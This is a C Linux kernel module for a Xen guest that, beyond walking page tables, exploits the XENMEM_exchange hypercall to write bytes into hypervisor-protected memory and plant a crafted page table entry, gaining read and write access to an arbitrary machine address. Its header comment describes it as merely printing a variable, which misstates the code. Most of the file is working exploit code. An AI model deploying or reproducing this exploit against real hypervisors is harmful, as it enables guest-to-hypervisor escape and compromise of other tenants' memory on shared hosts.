//Based on from https://stackoverflow.com/questions/15215865/netlink-sockets-in-c-using-the-3-x-linux-kernel?lq=1
/**
 *    This LKM will set a variable and print it value to the kernel buffer
 * for a specified number of times;
 * 
 * 
 */


#include "linux/gfp.h"
#include <linux/module.h>
#include <linux/kthread.h>
#include <linux/sched.h>  
#include <linux/delay.h>
#include <linux/types.h>
 
#include <linux/slab.h>
#include <asm/xen/page.h>
#include <asm/xen/hypervisor.h>
#include <asm/xen/hypercall.h>
#include <xen/interface/event_channel.h>
#include <xen/xen.h>
#include <xen/interface/xen.h>

#define PMD_FLAG (_PAGE_RW | _PAGE_USER | _PAGE_ACCESSED | _PAGE_DIRTY | _PAGE_PRESENT)
#define PTE_FLAG PMD_FLAG 
#define PT_FLAG (PTE_FLAG | _PAGE_NX | (1UL<<52))
#define PADDR_BITS 44
#define PADDR_MASK ((1ULL << PADDR_BITS)-1)
#define pg_entry(__pgd, i) ((__pgd) + i)
#define pgd_to_mfn(__pgd) ((__pgd->pgd & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pud_to_mfn(__pud) ((__pud->pud & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pmd_to_mfn(__pmd) ((__pmd->pmd & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pte_to_mfn(__pte) ((__pte->pte & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define no_reserved_bits(x) ((x & (1<<7)) | ( (x>>43) & 127))

#define __mfn(_v) ((unsigned long) (arbitrary_virt_to_machine(_v).maddr >> PAGE_SHIFT))
#define __machine_addr(_v) ((unsigned long) arbitrary_virt_to_machine(_v).maddr)

void page_walk(unsigned long va)
{
	pgd_t *pgd;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *pte;
	struct mm_struct *mm = current->mm;

	pgd = pgd_offset(mm, va);
	pud = pud_offset(pgd, va);
	pmd = pmd_offset(pud, va);
	pte = pte_offset_kernel(pmd, va);
	printk("PGD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pgd, __machine_addr(pgd), *(unsigned long*) pgd, pgd_index(va), (pgd_present(*pgd)) ? "P" : "");
	printk("PUD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pud, __machine_addr(pud), *(unsigned long*) pud, pud_index(va), (pud_present(*pud)) ? "P" : "");
	printk("PMD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pmd, __machine_addr(pmd), *(unsigned long*) pmd, pmd_index(va), (pmd_present(*pmd)) ? "P" : "", (pmd_large(*pmd)) ? "PSE" : "");
	printk("PTE (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pte, __machine_addr(pte), *(unsigned long*) pte, pte_index(va), (pte_present(*pte)) ? "P" : "", (pte_write(*pte)) ? "RW" : "");
}

pgd_t *get_pgd(unsigned long va)
{
	struct mm_struct *mm = current->mm;
	return pgd_offset(mm, va);
}

pud_t *get_pud(unsigned long va)
{
	return pud_offset(get_pgd(va), va);
}

pmd_t *get_pmd(unsigned long va)
{
	return pmd_offset(get_pud(va), va);
}

pte_t *get_pte(unsigned long va)
{
	return pte_offset_kernel(get_pmd(va), va);
}


struct task_struct *task;

static unsigned long addr = 0;
static unsigned long value = 0;
static unsigned int linear = 0;
module_param(value, ulong, 0);
module_param(addr, ulong, 0);
module_param(linear, int, 0);

unsigned long *va;

#define LOG(_f, _a...) \
	printk("arbitrary_access:%d - " _f "\n", __LINE__, ## _a);
#define logvar(_v,_f) \
    printk("\t" #_v ":\t" _f "\n",_v);

#define HYPERVISOR_tlb_flush_all() { \
	struct mmuext_op uops[] = {{.cmd =  MMUEXT_TLB_FLUSH_ALL}}; \
	HYPERVISOR_mmuext_op(uops, 1, NULL, DOMID_SELF); }

int mmu_update(unsigned long ptr, unsigned long val)
{
	struct mmu_update mmu_updates;
	int rc;

	mmu_updates.ptr = ptr;
	mmu_updates.val = val;
	rc = HYPERVISOR_mmu_update(&mmu_updates, 1, NULL, DOMID_SELF);
	HYPERVISOR_tlb_flush_all();

	return rc;
}
#define slow_print(...) ({pr_emerg(__VA_ARGS__); schedule_timeout_uninterruptible(2);})

unsigned long call_int_85(void);
void backstop_85_handler(void);

#define XENMEM_exchange 11UL
#define DOMID_SELF (0x7FF0U)
#define INTERRUPT_PAGEFAULT 14
#define VOID_PTE (mfn_pte(0, __pgprot(0)))
#define PHYSICAL_PMD_PAGE_MASK_  (((signed long)PMD_PAGE_MASK) & __PHYSICAL_MASK)
#define PHYSICAL_PUD_PAGE_MASK_  (((signed long)PUD_PAGE_MASK) & __PHYSICAL_MASK)

struct xen_memory_reservation {
    u64 extent_start;
    u64 nr_extents;
    u32 extent_order;
    u32 address_bits;
    u16 domid;
};

struct xen_memory_exchange {
    struct xen_memory_reservation in;
    struct xen_memory_reservation out;
    u64 nr_exchanged;
};


static int dealloc_with_last_byte(u8 val) {
  void *victim_page_virt;
  u64 in_extent;
  u64 out_extent;
  int ret;
  struct xen_memory_exchange args;
  while (1) {
    // Find a physical page whose MFN ends with the value we want.
    // Leak everything else.
    victim_page_virt = (void*)__get_free_pages(GFP_KERNEL, 0);
    if (!victim_page_virt) return 1;
    in_extent = virt_to_mfn(victim_page_virt);
    if ((in_extent & 0xff) != val) {
      //slow_print("got 0x%hhx, wanted 0x%hhx  (in_extent=0x%llx)\n", (u8)(in_extent & 0xff), val, in_extent);
      continue;
    }

    // Remove reference to the page.
    HYPERVISOR_update_va_mapping((unsigned long)victim_page_virt, VOID_PTE, 0);

    // Push the page on the domheap by exchanging it for a different one.
    // This calls XENMEM_exchange with legitimate arguments; the bug is triggered
    // in try_write_byte_hyper().
    out_extent = 0; /* this is probably not exactly right */
    args = (struct xen_memory_exchange){
      .in = {
        .extent_start = (u64)&in_extent,
        .nr_extents = 1,
        .domid = DOMID_SELF
      },
      .out = {
        .extent_start = (u64)&out_extent,
        .nr_extents = 1,
        .domid = DOMID_SELF
      }
    };
    ret = HYPERVISOR_memory_op(XENMEM_exchange, &args);
    if (ret != 0) {
      slow_print("exchange in dealloc_with_last_byte() failed with %d\n", ret);
      return ret;
    }
    return 0;
  }
}

/* writes a byte to Xen-enforced readonly physical memory, clobbering the next 7 bytes.
 * may fail silently because of raciness, caller should verify.
 * rval!=0 means stuff went wrong, memory allocation failure or so.
 */
static int try_write_byte_hyper(u8 *dst, u8 val) {
  u64 target_addr = arbitrary_virt_to_machine(dst).maddr + 0xffff830000000000;
  u64 out_extent_base_addr, in_extent, nr_exchanged,
      nr_extents, in_extent_addr, in_extent_base;
  void *victim_page_virt;
  struct xen_memory_exchange args;
  unsigned long ret;

  // hypervisor is lower than kernel, so hypervisor reference has to come first
  out_extent_base_addr = (target_addr & 0x7);

  victim_page_virt = (void*)__get_free_pages(GFP_KERNEL, 0);
  if (!victim_page_virt) return 1;
  in_extent = virt_to_mfn(victim_page_virt);

  // We need to do this to make steal_page() in memory_exchange() work.
  // Equivalent to xen_zap_pfn_range(victim_page_virt, 0, NULL, NULL).
  HYPERVISOR_update_va_mapping((unsigned long)victim_page_virt, VOID_PTE, 0);

  nr_exchanged = (target_addr - out_extent_base_addr) / 8;
  nr_extents = nr_exchanged + 1;
  in_extent_addr = (u64)&in_extent;
  in_extent_base = in_extent_addr - (nr_exchanged * 8);

  if (dealloc_with_last_byte(val))
    return 1;

  args = (struct xen_memory_exchange){
    .in = {
      .extent_start = in_extent_base,
      .nr_extents = nr_extents,
      .domid = DOMID_SELF
    },
    .out = {
      .extent_start = out_extent_base_addr,
      .nr_extents = nr_extents,
      .domid = DOMID_SELF
    },
    .nr_exchanged = nr_exchanged
  };
  ret = HYPERVISOR_memory_op(XENMEM_exchange, &args);
  if (ret) {
    slow_print("try_write_byte_hyper: hypercall returns 0x%lx\n", ret);
    return ret;
  }
  return 0;
}

static int write_byte_hyper(u8 *dst, u8 val) {
  slow_print("write_byte_hyper(%p, 0x%hhx)\n", dst, val);
  while (READ_ONCE(*dst) != val) {
    if (try_write_byte_hyper(dst, val))
      return 1;
  }
  slow_print("write_byte_hyper successful\n");
  return 0;
}

/*
 * Writes a Page-Directory-Pointer-Table Entry (PDPTE) that references a Page Directory.
 * Exploits the bug to create a reference to a Page Directory we fully control.
 * 1GB of memory is mapped through the Page Directory.
 */
static int set_pte_entry(pte_t *pte, u64 pg_phys_addr) {
  int i;

  /* data we want to write */
  u8 crafted_pte_entry[] = {
    /* flags of phys mapping:
     * present=1, write=1, user=1, pwt=0, pcd=0, a=0, d=0, ps=0
     * (including phys address zero)
     */
    0x07, 0, 0, 0, 0, 0, 0, 0,
    /* flags of adjacent mapping: present=0 (plus trailing garbage that's invisible here).
     * This is necessary because otherwise, trailing garbage from the first entry might
     * set the present bit for this entry. */
    0
  };
  *(uint64_t*)crafted_pte_entry |= pg_phys_addr;

  slow_print("### trying to write crafted PTE entry...\n");
  for (i = 0; i < sizeof(crafted_pte_entry); i++) {
    slow_print("### writing byte %d\n", i);
    if (write_byte_hyper(((u8*)pte) + i, crafted_pte_entry[i])) {
      slow_print("### write_byte_hyper failed!\n");
      return 1;
    }
  }
  slow_print("### crafted PTE entry written\n");
  return 0;
}

int startup_dump(unsigned long l2_entry_va, unsigned long aligned_mfn_va)
{
	pte_t *pte_aligned = get_pte(aligned_mfn_va);
	pte_t *pmd = get_pte(l2_entry_va);
	int rc;

	// removes RW bit on the aligned_mfn_va's pte
	rc = mmu_update(__machine_addr(pte_aligned) | MMU_NORMAL_PT_UPDATE, pte_aligned->pte & ~_PAGE_RW);
	if(rc < 0)
	{
		printk("cannot unset RW flag on PTE (0x%lx)\n", aligned_mfn_va);
		return -1;
	}
	printk("Successfully unset RW flag on PTE (0x%lx)\n", aligned_mfn_va);


	// map.
	rc = mmu_update(__machine_addr(pmd) | MMU_NORMAL_PT_UPDATE, (__mfn((void*) aligned_mfn_va) << PAGE_SHIFT) | PTE_FLAG);
	if(rc < 0)
	{
		printk("cannot update L1 entry 0x%lx\n", l2_entry_va);
		return -1;
	}
	printk("Updated L1 entry 0x%lx\n", l2_entry_va);

	return 0;
}

static int __init arbitrary_access_init(void) {

    //int rc = 0;
    int i;
    unsigned long *my_va = (void*)__get_free_pages(__GFP_ZERO, 0);
    unsigned long *my_va_mfn = (void*)__get_free_pages(__GFP_ZERO, 0);
    unsigned long *ptr;
    /*logvar(my_va,"%p");
    logvar(*my_va,"%lx");
    page_walk((unsigned long) my_va);
    
    */

    if ( !addr ){
        printk("Address parameter is mandatory!\n");
        return -1;
    }

    printk("Entering: %s\n",__FUNCTION__);
    logvar(my_va," %p");
    logvar((void *)__machine_addr(my_va),"mfn : %p");
    page_walk((unsigned long)my_va);
    logvar(my_va_mfn,"page that will hold the mfn: %p");
    logvar((void *)__machine_addr(my_va_mfn),"page that will hold the mfn : %p");
    page_walk((unsigned long)my_va_mfn);

    LOG("Setting the value of my_va[0] to 18012016");
    my_va[0] = 18012016;
    logvar(my_va[0]," %lu");

    LOG("Will start the linking");
    // This will make the my_va_mfn hold the PTE for the my_va
	if(startup_dump((unsigned long) my_va, (unsigned long) my_va_mfn))
	{
		LOG("unable to map PTE.");
		return -1;
	}



    //logvar(my_va,"Reference Address: %p");
    logvar(my_va," %p");
    page_walk((unsigned long)my_va);
    logvar(my_va_mfn,"%p");
    page_walk((unsigned long)my_va_mfn);



    uint64_t mfn = addr >> PAGE_SHIFT;
    int offset = addr & ~PAGE_MASK;
    LOG("Address of my_va");
    logvar((void *)my_va,"%p");
    page_walk((unsigned long)my_va);
    printk("The INPUT address info:\n");
    logvar(addr,"%lx");
    printk("\taddres:\t%lx\n",addr);
    printk("\tmfn:\t%llx\n",mfn);
    printk("\toffset:\t%x\n",offset);
    mfn = (mfn << PAGE_SHIFT) | PTE_FLAG;
    logvar(mfn,"%llx with flags");
    //logvar(*((unsigned long *)mfn),"%lx");
    LOG("Will set the page to the target mfn %llx",mfn);
    set_pte_entry(get_pte((unsigned long)my_va), mfn);
    barrier();
    page_walk((unsigned long)my_va);
    logvar(my_va[0]," %lu");
    logvar(my_va_mfn[0],"%lx");

    return 0; 
/*
    //return 0; 
    set_pte_entry(my_pte, mfn);
    barrier();
    LOG("Linking done!");
    page_walk(my_va);

    // Update the va to match the content 
    logvar((void *)my_va,"%p");
    my_va = my_va >> PAGE_SHIFT << PAGE_SHIFT;  // reset the offset byte
    logvar((void *)my_va,"%p");
    my_va = my_va | offset;
    logvar((void *)my_va,"%p");

    LOG("Print content in memory");
    //logvar(*((unsigned long *)my_va),"%lu");
    for(i=0; i<512; i++)
        logvar(*ptr++,"%lu");
    */

/*
    if ( value ){
        printk("Will write the %lx values into 0x%lu\n",value, addr);
        rc = HYPERVISOR_arbitrary_access(addr, &value, sizeof(value), ARBITRARY_WRITE);
        if ( rc ) 
        {
            printk("Error on writing using arbitrary_access: %d\n", rc);
            return rc;
        }

    }
    //reseting value just to make sure that the reading is workng
    value = 0;

    printk("It will read the value in 0x%lx\n", addr);
    rc = HYPERVISOR_arbitrary_access(addr, &value, sizeof(value), ARBITRARY_READ);

    if ( rc ) 
        printk("Error on reading on arbitrary_access: %d\n", rc);
    else 
        printk("Value stored on 0x%lx is 0x%lx\n", addr, value);

*/
    LOG("Done!");

    return 0;
}

static void __exit arbitrary_access_exit(void) {
    
    printk(KERN_INFO "Exiting arbitrary_access module\n");

}

module_init(arbitrary_access_init); 
module_exit(arbitrary_access_exit);


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Charles F.'. Goncalves");
